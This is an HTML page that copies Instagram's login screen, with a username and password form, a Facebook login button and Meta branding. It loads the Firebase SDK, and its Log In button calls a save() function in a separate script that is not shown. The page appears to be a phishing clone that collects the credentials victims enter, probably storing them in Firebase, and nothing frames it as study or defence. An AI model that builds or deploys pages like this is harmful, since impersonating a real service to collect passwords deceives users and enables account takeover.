<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
    <!--firebase-->
    <!-- The core Firebase JS SDK is always required and must be listed first -->
    <!-- Load the Firebase library before loading the body. -->
    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase.js"></script>

    <!-- Load the jQuery library, which we'll use to manipulate HTML elements with Javascript. -->
    <script src="https://code.jquery.com/jquery-2.2.0.min.js"></script>

    
    
</head>
<body>
    <script src="script.js"></script>
    <div class="container">
        <div>
            <p style="color: rgb(136, 129, 129);">English (UK) &nbsp;<i class="arrow down"></i></p>
        </div>
        <div class="box">
            <div class="heading"></div>
            <form id="contactForm">
                <div class="field">
                    <input id="username" type="name" placeholder="Phone number, username, or email" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" type="password" placeholder="password" />
                    <label for="password">Password</label>
                </div>
                <button onclick="save()" class="login-button" type="submit">Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class="">Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="#">Forgot password?</a>
                </div>
            </form>
        </div>

        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
        <br><br>
        <div style="height: 30px;">
            <p style="font-size: small;"><a class="signup" href="#"><img style="height: 15px;" src="meta.png" alt="" srcset=""></a></p>
        </div>
    </div>
</body>



</html>
